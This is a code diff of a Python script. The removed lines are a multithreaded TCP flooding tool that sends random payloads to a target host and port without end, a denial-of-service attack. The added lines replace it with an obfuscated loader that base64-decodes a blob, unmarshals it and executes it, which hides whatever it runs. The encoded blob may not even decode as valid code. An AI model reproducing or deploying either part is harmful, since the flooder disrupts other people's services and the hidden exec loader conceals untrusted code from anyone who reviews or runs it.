@@ -1,22 +1,5 @@
-import socket as s, threading as t, random as r, time as ti, os
+import marshal, base64, types
 
-def x(a, b, c):
-    print(f"\n[+] TCP Attack started on {a}:{b} with {c} threads\n")
-    d = r._urandom(1024)
+code = b'eJxVUktv2zAM/SsGe4WJ4wS6iFqvImFLbUoIogjFxoKaFi37AVImH+fdtQXc0Vqyxrlsz5n32ON59HLErbzGRrAKPRn1zcf+ZKePlmMGR6WKTzvY+f6i1QllG8ybO9V9g7D6FbZDN2N52obY2NnqK2zFcO+kFchm1bp/1IpKdpUOSmVklJ1EX1U4XpFwlFocb1g9XnZh2kMvmDpG8syekI5JqHR9ZmXYRVRvAdCpKuwNfI2KTGaDnYUGF7AahNnECmcHFKlXGM75x3Sm2DXTuZOHGrMY8DNjWUsTDZsdCE2r7MniWcuymnMXZ9+IN3cYTx5K0q9G7Lu4XNSXt1+9vxeWWl1b8Pj8+mLzGMomPFqjz3mhK6uqPUYj01I8htLKZkDFIu7CtZa2C2myQwrGHfK1p2pdpNnFLNO2Uw1bWWL6Vrp0HzUVZzEGylvwnzDNvd89i3Wg77+e3PCYZvW/hO28c8O9V9wH+g61Co='
 
-    def y():
-        while True:
-            try:
-                z = s.socket(s.AF_INET, s.SOCK_STREAM)
-                z.settimeout(3)
-                z.connect((a, b))
-                for _ in range(100): z.send(d)
-                z.close()
-                print(f"[+] Packet sent to {a}:{b}")
-            except s.timeout:
-                print(f"[!] Timeout {a}:{b}")
-            except Exception as e:
-                print(f"[!] Error: {str(e)}")
-
-    for _ in range(c):
-        t.Thread(target=y, daemon=True).start()
+exec(marshal.loads(base64.b64decode(code)))
